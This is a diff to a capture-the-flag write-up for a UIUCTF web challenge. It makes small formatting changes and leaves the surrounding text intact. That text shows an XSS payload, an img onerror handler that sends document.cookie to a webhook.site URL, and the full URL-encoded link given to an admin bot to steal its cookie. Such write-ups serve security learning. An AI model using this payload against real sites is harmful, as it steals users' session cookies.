@@ -8,7 +8,7 @@ categories:
 tags:
   - web
   - Typescript
-  - XSS
+  - xss
 authors:
   - Valenter
 ---
@@ -134,7 +134,7 @@ img"" /><img src=x onerror="fetch(\'%s?c=\'+encodeURIComponent(document.cookie))
 
 Finally, we encode it into the full URL and send a POST request with the link to the Admin Bot to visit the page and retrieve the flag, which is in the bot's cookies, by forwarding it to our webhook:
 
-```http
+```
 https://inst-8be5f028661a5917-ruler-of-the-universe.chal.uiuc.tf/module/0?message=img%22%22%20%2F%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2F66ce23cb-d0e5-4bf5-9016-58351c7f0d51%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%29%22%20x%3D%22
 ```
 
